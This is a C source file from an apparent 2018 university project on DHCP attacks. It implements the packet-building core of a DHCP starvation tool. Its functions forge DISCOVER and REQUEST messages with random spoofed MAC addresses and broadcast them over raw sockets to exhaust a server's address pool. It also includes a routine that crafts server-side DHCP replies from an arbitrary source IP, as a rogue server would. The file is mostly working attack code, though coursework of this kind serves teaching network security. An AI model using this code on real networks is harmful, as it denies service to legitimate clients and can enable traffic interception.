/**************************************
*        Project to PDS - 2018        *
*            DHCP attacks             *
*      Michal Gabonay - xgabon00      *
*  Faculty of Information Technology  *
*    University of Technology Brno    *
**************************************/

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <inttypes.h>
#include <linux/if_ether.h>
#include <locale.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netpacket/packet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "dhcp.h"
#include "pds-dhcpstarve.h"

unsigned char client_fake_mac[ETHERNET_HARDWARE_ADDRESS_LENGTH];
u_int32_t packet_xid = 0;

int send_discovery_packet(int socket, unsigned char *interface_mac,
                          int interface_index) {
  dhcp_packet_t dhcp_packet;
  memset(&dhcp_packet, 0, sizeof(dhcp_packet_t));

  dhcp_packet.op = BOOTREQUEST;
  dhcp_packet.htype = ETHERNET_HARDWARE_ADDRESS;
  dhcp_packet.hlen = ETHERNET_HARDWARE_ADDRESS_LENGTH;

  packet_xid = 0;
  dhcp_packet.xid = (uint32_t)rand() % UINT32_MAX;
  dhcp_packet.flags = htons(DHCP_BROADCAST_FLAG);
  packet_xid = dhcp_packet.xid;

  generate_mac_addr(client_fake_mac);
  memcpy(dhcp_packet.chaddr, client_fake_mac, sizeof(client_fake_mac));

  /* first four bytes of options field is magic cookie (as per RFC 2132) */
  dhcp_packet.options[0] = '\x63';
  dhcp_packet.options[1] = '\x82';
  dhcp_packet.options[2] = '\x53';
  dhcp_packet.options[3] = '\x63';

  // DHCP message type
  dhcp_packet.options[4] =
      DHCP_OPTION_MESSAGE_TYPE;    /* DHCP message type option identifier */
  dhcp_packet.options[5] = '\x01'; /* DHCP message option length in bytes */
  dhcp_packet.options[6] = DHCPDISCOVER;

  // dhcp options end
  dhcp_packet.options[7] = 255;

  unsigned char buffer[1500];
  int bufflen;
  int sent_bytes;
  struct sockaddr_ll lladdr;
  int dhcplen = get_dhcp_packet_size(&dhcp_packet);
  // int dhcplen =sizeof(&dhcp_packet)+1;

  init_sock_addr(&lladdr, interface_index);

  bufflen = create_dhcp_packet(buffer, sizeof(buffer), &dhcp_packet,
                               (size_t)dhcplen, interface_mac);

  if (bufflen < 0) {
    printf("Error: can not initialize packet to send\n");
    return EXIT_FAILURE;
  }

  sent_bytes = sendto(socket, buffer, (size_t)bufflen, 0,
                      (struct sockaddr *)&lladdr, sizeof(struct sockaddr_ll));
  if (sent_bytes <= 0) {
    printf("Error: can not send DHCP packet: %s\n", strerror(errno));
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}

int send_request_packet(int socket, unsigned char *interface_mac,
                        int interface_index, void *requested_addr,
                        uint8_t addr_len, void *server_identifier,
                        uint8_t server_len) {
  dhcp_packet_t dhcp_packet;
  memset(&dhcp_packet, 0, sizeof(dhcp_packet_t));

  dhcp_packet.op = BOOTREQUEST;
  dhcp_packet.htype = ETHERNET_HARDWARE_ADDRESS;
  dhcp_packet.hlen = ETHERNET_HARDWARE_ADDRESS_LENGTH;

  dhcp_packet.xid = packet_xid;

  memcpy(dhcp_packet.chaddr, client_fake_mac, sizeof(client_fake_mac));

  /* first four bytes of options field is magic cookie (as per RFC 2132) */
  dhcp_packet.options[0] = '\x63';
  dhcp_packet.options[1] = '\x82';
  dhcp_packet.options[2] = '\x53';
  dhcp_packet.options[3] = '\x63';

  // msg type
  dhcp_packet.options[4] =
      DHCP_OPTION_MESSAGE_TYPE;    /* DHCP message type option identifier */
  dhcp_packet.options[5] = '\x01'; /* DHCP message option length in bytes */
  dhcp_packet.options[6] = DHCPREQUEST;

  // requested address
  dhcp_packet.options[7] =
      DHCP_OPTION_REQUESTED_ADDRESS; /* DHCP message type option identifier */
  dhcp_packet.options[8] = '\x04';   /* DHCP message option length in bytes */
  memcpy(&dhcp_packet.options[9], requested_addr, addr_len);

  if (server_identifier != 0) {
    // server id
    dhcp_packet.options[13] =
        DHCP_OPTION_SERVER_IDENTIFIER; /* DHCP message type option identifier */
    dhcp_packet.options[14] = '\x04';  /* DHCP message option length in bytes */
    memcpy(&dhcp_packet.options[15], server_identifier, server_len);

    // dhcp options end
    dhcp_packet.options[19] = 255;
  } else {
    // dhcp options end
    dhcp_packet.options[13] = 255;
  }

  unsigned char buffer[1500];
  int bufflen;
  int sent_bytes;
  struct sockaddr_ll lladdr;
  int dhcplen = get_dhcp_packet_size(&dhcp_packet);
  // int dhcplen =sizeof(&dhcp_packet)+1;

  init_sock_addr(&lladdr, interface_index);

  bufflen = create_dhcp_packet(buffer, sizeof(buffer), &dhcp_packet,
                               (size_t)dhcplen, interface_mac);

  if (bufflen < 0) {
    printf("Error: can not initialize packet to send\n");
    return EXIT_FAILURE;
  }

  sent_bytes = sendto(socket, buffer, (size_t)bufflen, 0,
                      (struct sockaddr *)&lladdr, sizeof(struct sockaddr_ll));
  if (sent_bytes <= 0) {
    printf("Error: can not send DHCP packet: %s\n", strerror(errno));
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}

size_t get_dhcp_packet_size(dhcp_packet_t *msg) {
  int i;

  for (i = 4; i < MAX_DHCP_OPTIONS_LENGTH;) {
    if (msg->options[i] == 0 || msg->options[i] == 0xff)
      break;
    i++;
    i += msg->options[i] + 1;
  }

  if (i >= MAX_DHCP_OPTIONS_LENGTH)
    return EXIT_FAILURE;

  return sizeof(dhcp_packet_t) - MAX_DHCP_OPTIONS_LENGTH + i + 1;
}

int create_dhcp_packet(unsigned char *buffer, size_t bufflen, void *data,
                       size_t datalen, unsigned char *interface_mac) {
  /* header and data pointers */
  struct ethhdr *eth_h = (struct ethhdr *)buffer;
  struct iphdr *ip_h = (struct iphdr *)(buffer + sizeof(struct ethhdr));
  struct udphdr *udp_h =
      (struct udphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
  unsigned char *udpdata = (unsigned char *)udp_h + sizeof(struct udphdr);
  unsigned short udplen = sizeof(struct udphdr) + datalen;
  size_t packet_len = sizeof(struct ethhdr) + sizeof(struct iphdr) +
                      sizeof(struct udphdr) + datalen;

  if (datalen % 2 != 0) {
    packet_len++;
    udplen++;
  }

  if (packet_len > bufflen)
    return EXIT_FAILURE;

  memset(buffer, 0, packet_len);
  memcpy(udpdata, data, datalen);

  // UDP header
  udp_h->source = htons(DHCP_CLIENT_PORT);
  udp_h->dest = htons(DHCP_SERVER_PORT);
  udp_h->len = htons(udplen);
  udp_h->check = 0;

  // IP header
  ip_h->ihl = 5;
  ip_h->version = 4;
  ip_h->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + datalen);
  ip_h->ttl = 255;
  ip_h->protocol = 17;
  ip_h->saddr = inet_addr("0.0.0.0");
  ip_h->daddr = inet_addr("255.255.255.255");
  ip_h->check = 0;
  ip_h->check = ip_csum((unsigned short *)ip_h, sizeof(struct iphdr) >> 1);

  // ethernet header
  memcpy(&eth_h->h_source, interface_mac, sizeof(eth_h->h_source));
  memcpy(&eth_h->h_dest, broadcast_mac, sizeof(eth_h->h_dest));
  eth_h->h_proto = htons(ETH_P_IP);

  return packet_len;
}

unsigned short ip_csum(unsigned short *buf, int nwords) {
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

int dhcp_get_option(dhcp_packet_t *dhcp, uint8_t optcode, void *buffer,
                    size_t bufsize, size_t *optlen) {
  int i;
  size_t len;

  for (i = 4; i < MAX_DHCP_OPTIONS_LENGTH;) {
    if (dhcp->options[i] == 0 || dhcp->options[i] == 0xff)
      return -1;
    if (dhcp->options[i] == optcode)
      break;
    i++;
    i += dhcp->options[i] + 1;
  }

  len = (size_t)(dhcp->options[i + 1]);

  if (MAX_DHCP_OPTIONS_LENGTH <= (i + len + 2))
    return EXIT_FAILURE;

  memcpy(buffer, &dhcp->options[i + 2], (len > bufsize) ? bufsize : len);
  if (optlen != NULL)
    *optlen = len;

  return EXIT_SUCCESS;
}

dhcp_packet_t *parse_dhcp_offer(uint8_t *stream, uint32_t *server_id) {
  dhcp_packet_t *dhcp_offer = (dhcp_packet_t *)(stream + 28);

  if (0 != dhcp_get_option(dhcp_offer, DHCP_OPTION_SERVER_IDENTIFIER, server_id,
                           sizeof(server_id), NULL)) {
    // printf("no server id option in DHCPOFFER \n");
    server_id = 0;
  }

  return dhcp_offer;
}

// generate random mac address, used as cliend hardware address in sent dhcp packet
void generate_mac_addr(void *buffer) {
  unsigned char *mac = (unsigned char *)buffer;
  int i, tmp;
  srand(time(NULL) + getpid());

  for (i = 0; i < 6; i++) {
    tmp = rand() % 256;
    if (i == 0)
      tmp &= ~((uint8_t)3);
    mac[i] = tmp;
  }
}

/*
 * Initialise sockaddr_ll structure, device-independent physical-layer address.
 */
void init_sock_addr(struct sockaddr_ll *lladdr, int interface_index) {
  memset(lladdr, 0, sizeof(struct sockaddr_ll));
  lladdr->sll_family = AF_PACKET;
  lladdr->sll_protocol = ETH_P_IP;
  lladdr->sll_ifindex = interface_index;
  lladdr->sll_hatype = 1;
  lladdr->sll_pkttype = PACKET_BROADCAST;
  lladdr->sll_halen = ETH_ALEN;
  memcpy(lladdr->sll_addr, broadcast_mac, sizeof(broadcast_mac));
}

int create_server_dhcp_packet(unsigned char *buffer, size_t bufflen, void *data,
                       size_t datalen, unsigned char *interface_mac,
                       char *src_ip, uint32_t dst_ip) {
  /* header and data pointers */
  struct ethhdr *eth_h = (struct ethhdr *)buffer;
  struct iphdr *ip_h = (struct iphdr *)(buffer + sizeof(struct ethhdr));
  struct udphdr *udp_h =
      (struct udphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
  unsigned char *udpdata = (unsigned char *)udp_h + sizeof(struct udphdr);
  unsigned short udplen = sizeof(struct udphdr) + datalen;
  size_t packet_len = sizeof(struct ethhdr) + sizeof(struct iphdr) +
                      sizeof(struct udphdr) + datalen;

  if (datalen % 2 != 0) {
    packet_len++;
    udplen++;
  }

  if (packet_len > bufflen)
    return EXIT_FAILURE;

  memset(buffer, 0, packet_len);
  memcpy(udpdata, data, datalen);

  // UDP header
  udp_h->source = htons(DHCP_SERVER_PORT);
  udp_h->dest = htons(DHCP_CLIENT_PORT);
  udp_h->len = htons(udplen);
  udp_h->check = 0;

  // IP header
  ip_h->ihl = 5;
  ip_h->version = 4;
  ip_h->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + datalen);
  ip_h->ttl = 255;
  ip_h->protocol = 17;
  ip_h->saddr = inet_addr(src_ip);
  ip_h->daddr = dst_ip;
  ip_h->check = 0;
  ip_h->check = ip_csum((unsigned short *)ip_h, sizeof(struct iphdr) >> 1);

  // ethernet header
  memcpy(&eth_h->h_source, interface_mac, sizeof(eth_h->h_source));
  memcpy(&eth_h->h_dest, broadcast_mac, sizeof(eth_h->h_dest));
  eth_h->h_proto = htons(ETH_P_IP);

  return packet_len;
}